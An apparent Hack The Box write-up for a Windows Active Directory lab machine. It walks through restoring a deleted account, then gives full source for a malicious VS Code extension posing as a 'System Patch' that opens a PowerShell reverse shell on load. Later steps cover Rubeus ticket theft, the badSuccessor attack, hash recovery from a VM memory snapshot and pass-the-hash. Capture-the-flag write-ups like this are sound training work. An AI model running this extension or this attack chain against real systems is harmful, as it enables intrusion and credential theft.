---
layout: post
title: "HTB - Checkpoint"
date: 2026-06-17
category: hacking
---

## overview
Checkpoint is a medium windows machine, which focuses on deleted object exploitation and the badSuccessor attack for privesc.

## foothold
The NMAP scan shows the following results:
```
# Nmap 7.94SVN scan initiated Mon Jun 15 12:27:31 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -o scan.nmap 10.129.20.138
Nmap scan report for 10.129.20.138
Host is up, received echo-reply ttl 127 (0.077s latency).
Scanned at 2026-06-15 12:27:32 EDT for 75s
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-15 23:19:03Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h51m16s
| smb2-time: 
|   date: 2026-06-15T23:19:16
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43713/tcp): CLEAN (Timeout)
|   Check 2 (port 8044/tcp): CLEAN (Timeout)
|   Check 3 (port 15613/udp): CLEAN (Timeout)
|   Check 4 (port 51917/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 12:28:47 2026 -- 1 IP address (1 host up) scanned in 75.53 seconds
```
We add the host to `/etc/hosts`:
```
echo '10.129.20.138 checkpoint.htb dc01.checkpoint.htb dc01' | sudo tee -a /etc/hosts
```
Let's list the shares with the credentials we are given:
<img src="/assets/images/hacking/checkpoint/image1.png" style="display:block; margin:1.2rem auto;">
Running `--rid-brute`, discovering the below users:
```
alex.turner/Checkpoint2024!

users:
ryan.brooks
svc_deploy
james.harper
sarah.mitchell
emily.carter
david.reynolds
jessica.coleman
lauren.flores
michael.torres
kevin.patterson
brian.jenkins
megan.perry
```
Listing deleted objects with `bloodyAD`:
```
bloodyAD --host dc01.checkpoint.htb -d CHECKPOINT.HTB -u alex.turner -p 'Checkpoint2024!' get search -c 1.2.840.113556.1.4.2064 --filter "(isDeleted=TRUE)"
```
The very last objects appears to be an account:
<img src="/assets/images/hacking/checkpoint/image2.png" style="display:block; margin:1.2rem auto;">
Restoring the account:
```
bloodyAD --host dc01.checkpoint.htb -d CHECKPOINT.HTB -u alex.turner -p 'Checkpoint2024!' set restore 'mark.davies'
```
<img src="/assets/images/hacking/checkpoint/image3.png" style="display:block; margin:1.2rem auto;">
Mark’s account uses the same password as turner’s (the step here is passwordspray, I kind of guessed it though lol):
<img src="/assets/images/hacking/checkpoint/image4.png" style="display:block; margin:1.2rem auto;">
So now, we can list the shares through mark:
<img src="/assets/images/hacking/checkpoint/image5.png" style="display:block; margin:1.2rem auto;">
We see that the `DevDrop` share is now writable. The description hints at a `.vsix` exploit. Now my thought is, since we have write perms on `DevDrop`, lets upload a malicious `.vsix` package and get a revshell.
AI did help a bit here, however you can find reference articles online. Lets create two folders, `mal-extension` and inside one called `src`. In the root folder we write the file `package.json`:
```json
{
    "name": "checkpoint-patch",
    "displayName": "Checkpoint System Patch",
    "version": "0.0.1",
    "publisher": "checkpoint",
    "engines": {
        "vscode": "^1.118.0"
    },
    "activationEvents": [
        "*"
    ],
    "main": "./src/extension.js"
}
```
In `/src`, create `extension.js`:
```js
const vscode = require('vscode');
const cp = require('child_process');

function activate(context) {
    // Standard Windows PowerShell reverse shell payload
    const payload = '$client = New-Object System.Net.Sockets.TCPClient("<ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
    
    // Base64 encode it natively using Node.js buffers to avoid character escaping bugs on Windows CLI
    const b64Payload = Buffer.from(payload, 'utf16le').toString('base64');
    
    // Execute via hidden powershell process
    cp.exec(`powershell -e ${b64Payload}`, (err, stdout, stderr) => {
        if (err) return;
    });
}

function deactivate() {}

module.exports = {
    activate,
    deactivate
}
```
(don't forget to edit \<ip\>)
Create the package by running `vsce package` from the root folder. Upload the created package to the `DevDrop` share and open a listener on a separate pane. Wait for the connection to hit:
<img src="/assets/images/hacking/checkpoint/image6.png" style="display:block; margin:1.2rem auto;">
<img src="/assets/images/hacking/checkpoint/image7.png" style="display:block; margin:1.2rem auto;">
Grab the user flag:
<img src="/assets/images/hacking/checkpoint/image8.png" style="display:block; margin:1.2rem auto;">

## privesc
Starting privesc, run `Bloodhound` and check the relations between the objects. The one that stands out is this:
<img src="/assets/images/hacking/checkpoint/image9.png" style="display:block; margin:1.2rem auto;">
We see `ryan.brooks` has `genericWrite` over `svc_deploy`. Let's run the `badSuccessor` attack, through its module in `bloodyAD`. To start the attack, let's obtain ryan's TGT with the following series of commands:
```
(upload Rubeus to the shell)
(New-Object Net.WebClient).DownloadFile('Rubeus.exe', 'C:\Users\ryan.brooks\Desktop\Rubeus.exe')
.\Rubeus.exe tgtdeleg /nowrap

echo “<b64_blob>” > ryan.b64
base64 -d ryan.b64 > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan_brooks.ccache
export KRB5CCACHE=ryan_brooks.ccache
```
Now we have ryan's TGT. In order to perform the `badSuccessor` attack, first search for writable objects for ryan. The very first lines in the output reveal it all:
```
bloodyAD --host dc01.checkpoint.htb -d CHECKPOINT.HTB -u ryan.brooks -k get writable --detail
```
```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
device: CREATE_CHILD
….
```
We can see the target OU is `DMSAHolder`. That's the target for `badSuccessor`.
```
bloodyAD --host dc01.checkpoint.htb -d CHECKPOINT.HTB -u ryan.brooks \
  -k ccache=/home/user640/Desktop/htb_mf/mid/Checkpoint/ryan_brooks.ccache add badSuccessor rogue_dmsa \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
  ```
Now, the ccache of `rogue_dmsa` is automatically saved so no need to use `ticketConverter`. Also, it synchronizes with Kerberos automatically but do `sudo ntpdate <box ip>` if needed. Now export the ticket with `export KRB5CCNAME=rogue_dmsa_WJ.ccache`. Furthermore, we have the RC4 for `svc_deploy`
`(e16081eb077aca74bdbf8af12af43ac9)`, and `svc_deploy` belongs to the `BackupAccess` group, so without wasting any time we can use our intuition and do `evil-winrm`
<img src="/assets/images/hacking/checkpoint/image10.png" style="display:block; margin:1.2rem auto;">
Since we have access to backups, I went to the previously-inaccessible share `VMBackups` and saw some very important files. One friend suggested to use `VMKatz` which is a nice shortcut for this step. You can download the VMKatz tool from github. We upload it and use it against the `.vmem` snapshot (run `upload vmkatz.exe <location>`):
<img src="/assets/images/hacking/checkpoint/image11.png" style="display:block; margin:1.2rem auto;">
We see the uncovered NT Hash for the admin. Get the root flag:
`evil-winrm -i 10.129.20.138 -u Administrator -H f29e9c014295b9b32139b09a2790be3b`